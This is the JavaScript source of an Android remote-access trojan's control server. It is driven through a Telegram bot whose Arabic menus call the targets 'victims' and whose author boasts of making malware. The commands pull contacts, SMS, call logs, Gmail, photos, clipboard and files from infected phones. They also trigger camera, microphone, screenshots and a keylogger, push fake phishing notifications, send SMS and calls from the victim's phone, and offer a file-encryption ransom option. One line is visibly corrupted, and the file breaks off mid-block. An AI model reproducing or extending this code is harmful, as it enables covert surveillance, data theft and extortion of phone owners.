const express = require("express");
const http = require("http");
const {
  Server
} = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require('fs');
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, {
  'polling': true
});
const appData = new Map();
const actions = ["📒 سحب جهات اتصال 📒", "💬 سحب الرسائل 💬", "📞 سجل المكالمات 📞", "📽 التطبيقات 📽", "📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸", "🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋", "📺 لقطة شاشة 📺", "😎 اضهار رساله اسفل الشاشة 😎", "💬 ارسال رساله 💬", "📳 اهتزاز 📳", "▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑", "🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑", "📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬", "💬 ارسال رساله لجميع ارقام الضحيه 💬", "‼ اشعار صفحة مزورة ‼", "📧 سحب رسايل جيميل 📧", "⚠️ تشفير ملفات ⚠️", "☎️اتصال من هاتف الضحيه☎️", "✯ العودة إلى القائمة الرئيسية ✯"];
app.get('/', (_0x475404, _0x364a1f) => {
  _0x364a1f.send("تم رفع الخادم معا تحيات المطور الملك صقر ");
});
app.post("/upload", uploader.single("file"), (_0x504b1c, _0x252371) => {
  const _0xdb74ab = _0x504b1c.file.originalname;
  const _0xa03b1b = _0x504b1c.headers.model;
  bot.sendDocument(data.id, _0x504b1c.file.buffer, {
    'caption': "<b>✯ تم تحميل ملف من هاتف الضحيه → " + _0xa03b1b + "</b>",
    'parse_mode': "HTML"
  }, {
    'filename': _0xdb74ab,
    'contentType': "*/*"
  });
  _0x252371.send("Done");
});
io.on("connection", _0x5c13cb => {
  let _0x444e7d = _0x5c13cb.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let _0x5d119c = _0x5c13cb.handshake.headers.version || "no information";
  let _0x76c6b1 = _0x5c13cb.handshake.headers.ip || "no information";
  _0x5c13cb.model = _0x444e7d;
  _0x5c13cb.version = _0x5d119c;
  let _0x35ea49 = "<b>✯ جهاز الضحية متصل</b>\n\n" + ("<b>اسم الهاتف</b> → " + _0x444e7d + "\n") + ("<b>إصدارالهاتف</b> → " + _0x5d119c + "\n") + ("<b>𝚒𝚙</b> → " + _0x76c6b1 + "\n") + ("<b>الوقت</b> → " + _0x5c13cb.handshake.time + "\n\n");
  bot.sendMessage(data.id, _0x35ea49, {
    'parse_mode': "HTML"
  });
  _0x5c13cb.on("disconnect", () => {
    let _0x263547 = "<b>✯ الجهاز غير متصل</b>\n\n" + ("<b>اسم الهاتف</b> → " + _0x444e7d + "\n") + ("<b>إصدار الهاتف</b> → " + _0x5d119c + "\n") + ("<b>𝚒𝚙</b> → " + _0x76c6b1 + "\n") + ("<b>الوقت</b> → " + _0x5c13cb.handshake.time + "\n\n");
    bot.sendMessage(data.id, _0x263547, {
      'parse_mode': "HTML"
    });
  });
  _0x5c13cb.on("file-explorer", _0x4ccc0c => {
    let _0x520b32 = [];
    let _0x41751b = [];
    _0x4ccc0c.forEach((_0x2162d1, _0x2a1b0c) => {
      let _0x5b8386;
      if (_0x2162d1.isFolder) {
        _0x5b8386 = _0x444e7d + "|cd-" + _0x2162d1.name;
      } else {
        _0x5b8386 = _0x444e7d + "|request-" + _0x2162d1.name;
      }
      if (_0x41751b.length === 0 || _0x41751b.length === 1) {
        _0x41751b.push({
          'text': _0x2162d1.name,
          'callback_data': _0x5b8386
        });
        if (_0x2a1b0c + 1 === _0x4ccc0c.length) {
          _0x520b32.push(_0x41751b);
        }
      } else if (_0x41751b.length === 2) {
        _0x41751b.push({
          'text': _0x2162d1.name,
          'callback_data': _0x5b8386
        });
        _0x520b32.push(_0x41751b);
        _0x41751b = [];
      }
    });
    _0x520b32.push([{
      'text': "✯ رجوع ✯",
      'callback_data': _0x444e7d + "|back-0"
    }]);
    bot.sendMessage(data.id, "<b>✯ تم عرض جميع الملفات لدى الضحيه " + _0x444e7d + "</b>", {
      'reply_markup': {
        'inline_keyboard': _0x520b32
      },
      'parse_mode': "HTML"
    });
  });
  _0x5c13cb.on("message", _0xfa321a => {
    bot.sendMessage(data.id, "<b>✯ تم استلم رساله من هاتف الضحيه → " + _0x444e7d + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" + _0xfa321a, {
      'parse_mode': "HTML"
    });
  });
});
bot.on("message", _0x517bec => {
  if (_0x517bec.text === "/start") {
    bot.sendMessage(data.id, "<b>✯ اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 5</b>\n\nبوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم باي هاتف أندرويد \nتم تطوير البوت من قبل 🇩🇿 عبدو الشلفاوي  تم تطويره لاجل التسليه والراقابه الابوايه فل المطور لا يتحمل مسؤولية سو استخدمه فيما يغضب الله @fox_dXx \n\nتواصل بل المطور: @fox_dXx ", {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
        'resize_keyboard': true
      }
    });
  } else {
    if (appData.get("currentAction") === "microphoneDuration") {
      let _0x1a6221 = _0x517bec.text;
      let _0x177892 = appData.get("currentTarget");
      io.to(_0x177892).emit("commend", {
        'request': "microphone",
        'extras': [{
          'key': "duration",
          'value': _0x1a6221
        }]
      });
      appData["delete"]("currentTarget");
      appData["delete"]("currentAction");
      bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get("currentAction") === "toastText") {
        let _0x11ad45 = _0x517bec.text;
        let _0x90e23e = appData.get("currentTarget");
        io.to(_0x90e23e).emit("commend", {
          'request': "toast",
          'extras': [{
            'key': "text",
            'value': _0x11ad45
          }]
        });
        appData["delete"]("currentTarget");
        appData["delete"]("currentAction");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
            'resize_keyboard': true
          }
        });
      }
    }
  }
  if (appData.get("currentAction") === "makeCallNumber") {
    let _0x47ae3a = _0x517bec.text;
    appData.set("currentNumber", _0x47ae3a);
    appData.set("currentAction", "makeCallText");
    bot.sendMessage(data.id, "<b>✯ الان ارسل كلمه **موافق** لتاكيد اجراء  المكالمه " + _0x47ae3a + "</b>\n\n", {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [["✯ التراجع عن الاجراء ✯"]],
        'resize_keyboard': true,
        'one_time_keyboard': true
      }
    });
  } else {
    if (appData.get("currentAction") === "makeCallText") {
      let _0x24ed4e = _0x517bec.text;
      let _0x3d83d5 = appData.get("currentNumber");
      let _0x1c5ece = appData.get("currentTarget");
      io.to(_0x1c5ece).emit("commend", {
        'request': "makeCall",
        'extras': [{
          'key': "number",
          'value': _0x3d83d5
        }, {
          'key': "text",
          'value': _0x24ed4e
        }]
      });
      appData["delete"]("currentTarget");
      appData["delete"]("currentAction");
      appData["delete"]("currentNumber");
      bot.sendMessage(data.id, "<b>✯ تم تنفيذ طلب الاتصال بنجاح     ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get("currentAction") === "smsNumber") {
        let _0x7aa3c7 = _0x517bec.text;
        appData.set("currentNumber", _0x7aa3c7);
        appData.set("currentAction", "smsText");
        bot.sendMessage(data.id, "<b>✯ اكتب الرساله التي تريد ارسالها الا " + _0x7aa3c7 + "</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [["✯ التراجع عن الاجراء ✯"]],
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        });
      } else {
        if (appData.get("currentAction") === "smsText") {
          let _0x3deca2 = _0x517bec.text;
          let _0x3e88f9 = appData.get("currentNumber");
          let _0x30d107 = appData.get("currentTarget");
          io.to(_0x30d107).emit("commend", {
            'request': "sendSms",
            'extras': [{
              'key': "number",
              'value': _0x3e88f9
            }, {
              'key': "text",
              'value': _0x3deca2
            }]
          });
          appData["delete"]("currentTarget");
          appData["delete"]("currentAction");
          appData["delete"]("currentNumber");
          bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
              'resize_keyboard': true
            }
          });
        } else {
          if (appData.get("currentAction") === "vibrateDuration") {
            let _0x43c616 = _0x517bec.text;
            let _0x3bd550 = appData.get("currentTarget");
            io.to(_0x3bd550).emit("commend", {
              'request': "vibrate",
              'extras': [{
                'key': "duration",
                'value': _0x43c616
              }]
            });
            appData["delete"]("currentTarget");
            appData["delete"]("currentAction");
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
              'parse_mode': "HTML",
              'reply_markup': {
                'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                'resize_keyboard': true
              }
            });
          } else {
            if (appData.get("currentAction") === "textToAllContacts") {
              let _0x252791 = _0x517bec.text;
              let _0x2bee9a = appData.get("currentTarget");
              io.to(_0x2bee9a).emit("commend", {
                'request': "smsToAllContacts",
                'extras': [{
                  'key': "text",
                  'value': _0x252791
                }]
              });
              appData["delete"]("currentTarget");
              appData["delete"]("currentAction");
              bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                'parse_mode': "HTML",
                'reply_markup': {
                  'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                  'resize_keyboard': true
                }
              });
            } else {
              if (appData.get("currentAction") === "notificationText") {
                let _0x3460aa = _0x517bec.text;
                appData.set("currentNotificationText", _0x3460aa);
                appData.set("currentAction", "notificationUrl");
                bot.sendMessage(data.id, "<b>✯ الان اكتب الرابط الذي تريده ان يظهر بعد الضغط على اسم الرابط </b>\n\n", {
                  'parse_mode': "HTML",
                  'reply_markup': {
                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                    'resize_keyboard': true,
                    'one_time_keyboard': true
                  }
                });
              } else {
                if (appData.get("currentAction") === "notificationUrl") {
                  let _0xa5296c = _0x517bec.text;
                  let _0x46fa42 = appData.get("currentNotificationText");
                  let _0x5c16e6 = appData.get("currentTarget");
                  io.to(_0x5c16e6).emit("commend", {
                    'request': "popNotification",
                    'extras': [{
                      'key': "text",
                      'value': _0x46fa42
                    }, {
                      'key': "url",
                      'value': _0xa5296c
                    }]
                  });
                  appData["delete"]("currentTarget");
                  appData["delete"]("currentAction");
                  appData["delete"]("currentNotificationText");
                  bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                    'parse_mode': "HTML",
                    'reply_markup': {
                      'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                      'resize_keyboard': true
                    }
                  });
                } else {
                  if (_0x517bec.text === "✯ عدد الاجهزه ✯") {
                    if (io.sockets.sockets.size === 0) {
                      bot.sendMessage(data.id, "<b>✯ لايوجد ضحية متصل</b>\n\n", {
                        'parse_mode': "HTML"
                      });
                    } else {
                      let _0x21861d = "<b>✯ عدد الاجهزه المخترقه: " + io.sockets.sockets.size + "</b>\n\n";
                      let _0x552593 = 1;
                      io.sockets.sockets.forEach((_0x58299b, _0x5483ae, _0x9193a2) => {
                        _0x21861d += "<b>العدد " + _0x552593 + "</b>\n" + ("<b>اسم الهاتف</b> → " + _0x58299b.model + "\n") + ("<b>إصدار الهاتف</b> → " + _0x58299b.version + "\n") + ("<b>𝚒𝚙</b> → " + _0x58299b.ip + "\n") + ("<b>الوقت</b> → " + _0x58299b.handshake.time + "\n\n");
                        _0x552593 += 1;
                      });
                      bot.sendMessage(data.id, _0x21861d, {
                        'parse_mode': "HTML"
                      });
                    }
                  } else {
                    if (_0x517bec.text === "✯ قائمة التحكم ✯") {
                      if (io.sockets.sockets.size === 0) {
                        bot.sendMessage(data.id, "<b>✯ لايوجد ضحية متصل </b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
                        let _0x1075d0 = [];
                        io.sockets.sockets.forEach((_0x30f158, _0x115073, _0x3e22bd) => {
                          _0x1075d0.push([_0x30f158.model]);
                        });
                        _0x1075d0.push(["✯ العودة إلى القائمة الرئيسية ✯"]);
                        bot.sendMessage(data.id, "<b>✯ حدد الجهاز اللي تريد التحكم به</b>\n\n", {
                          'parse_mode': "HTML",
                          'reply_markup': {
                            'keyboard': _0x1075d0,
                            'resize_keyboard': true,
                            'one_time_keyboard': true
                          }
                        });
                      }
                    } else {
                      if (_0x517bec.text === "✯ معلومات عن المطور ✯") {
                        bot.sendMessage(data.id, "<b>✯ نحن الجيش الشلفاوي السيبراني نخترق \nنصنع برمجيات خبيثه لاختراق الاجهزه, \n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @fox_dXx\nTelegram → https://t.me/sx2teamcrack</b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
                        if (_0x517bec.text === "✯ العودة إلى القائمة الرئيسية ✯") {
                          bot.sendMessage(data.id, "<b>✯ القائمة الرئيسية</b>\n\n", {
                            'parse_mode': "HTML",
                            'reply_markup': {
                              'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                              'resize_keyboard': true
                            }
                          });
                        } else {
                          if (_0x517bec.text === "✯ التراجع عن الاجراء ✯") {
                            let _0x20b5f2 = io.sockets.sockets.get(appData.get("currentTarget")).model;
                            bot.sendMessage(data.id, "<b>✯ حدد اجرا اي شي تريد بجهاز الضحيه " + _0x20b5f2 + "</b>\n\n", {
                              'parse_mode': "HTML",
                              'reply_markup': {
                                'keyboard': [["📒 سحب جهات اتصال 📒", "💬 سحب الرسائل 💬"], ["📞 سجل المكالمات 📞", "📽 التطبيقات 📽"], ["📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸"], ["🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋"], ["📺 لقطة شاشة 📺", "😎 اضهار رساله =اسفل الشاشة 😎"], ["💬 ارسال رساله 💬", "📳 اهتزاز 📳"], ["▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑"], ["🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑"], ["📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬"], ["💬 ارسال رساله لجميع ارقام الضحيه 💬"], ["‼ اشعار صفحة مزورة ‼", "📧 سحب رسايل جيميل 📧"], ["⚠️ تشفير ملفات ⚠️", "☎️اتصال من هاتف الضحيه☎️"], ["✯ العودة إلى القائمة الرئيسية ✯"]],
                                'resize_keyboard': true,
                                'one_time_keyboard': true
                              }
                            });
                          } else {
                            if (actions.includes(_0x517bec.text)) {
                              let _0xc65239 = appData.get("currentTarget");
                              if (_0x517bec.text === "📒 سحب جهات اتصال 📒") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "contacts",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "💬 سحب الرسائل 💬") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "all-sms",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📞 سجل المكالمات 📞") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "calls",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📽 التطبيقات 📽") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "apps",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📸 كيمرا خلفيه 📸") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "main-camera",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📸 كيمرا أمامية 📸") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "selfie-camera",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📋 سجل الحافظه 📋") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "clipboard",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📺 لقطة شاشة 📺") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "screenshot",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "🦝 اضهار اشعارات الضحية 🦝") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "keylogger-on",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "🛑 ايقاف الاشعارات 🛑") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "keylogger-off",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📂 عرض جميع الملفات 📂") {
                                io.to(_0xc65239).emit("file-explorer", {
                                  'request': 'ls',
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "🎬 سحب جميع الصور 🎬") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "gallery",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "🎙 تسجيل صوت 🎙") {
                                appData.set("currentAction", "microphoneDuration");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "😎 اضهار رساله اسفل الشاشة 😎") {
                                appData.set("currentAction", "toastText");
                                bot.sendMessage(data.id, "<b>✯ اكتب الرسالة التي تريد اضهارها اسفل الشاشة</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "💬 ارسال رساله 💬") {
                                appData.set("currentAction", "smsNumber");
                                bot.sendMessage(data.id, "<b>✯ ✯ اكتب الرقم الذي تريد إرسال الرساله اليه اذا كان الضحيه ليس من بلدك فكتب الرقم معا رمز الدوله </b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "☎️اتصال من هاتف الضحيه☎️") {
                                appData.set("currentAction", "makeCallNumber");
                                bot.sendMe = ssage(data.id, "<b>✯ ارسل الرقم الذي تريد الاتصال به</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "⚠️ تشفير ملفات ⚠️") {
                                appData.set("currentAction", '');
                                bot.sendMessage(data.id, "<b>✯ ارسل كود فك تشفير الملفات</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📳 اهتزاز 📳") {
                                appData.set("currentAction", "vibrateDuration");
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "📧 سحب رسايل جيميل 📧") {
                                io.to(_0xc65239).emit("commend", {
                                  'request': "all-email",
                                  'extras': []
                                });
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "💬 ارسال رساله لجميع ارقام الضحيه 💬") {
                                appData.set("currentAction", "textToAllContacts");
                                bot.sendMessage(data.id, "<b>✯ اكتب الرساله التي تريد ارسالها الا جميع ارقام</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "‼ اشعار صفحة مزورة ‼") {
                                appData.set("currentAction", "notificationText");
                                bot.sendMessage(data.id, "<b>✯ اكتب الرساله التي تريدها ان تظهر في الاشعارات</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0x517bec.text === "▶ تشغيل الصوت ▶") {
                                appData.set("currentAction", "recordVoice");
                                bot.sendMessage(data.id, "<b>✯ سجل اي صوت لاتشغيله بهاتف الضحيه</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ التراجع عن الاجراء ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                            } else {
                              io.sockets.sockets.forEach((_0x4324b2, _0x200d29, _0x5e4345) => {
                                if (_0x517bec.text === _0x4324b2.model) {
                                  appData.set("currentTarget", _0x200d29);
                                  bot.sendMessage(data.id, "<b>✯ حدد اجرا اي شي تريد بجهاز الضحيه " + _0x4324b2.model + "</b>\n\n", {
                                    'parse_mode': "HTML",
                                    'reply_markup': {
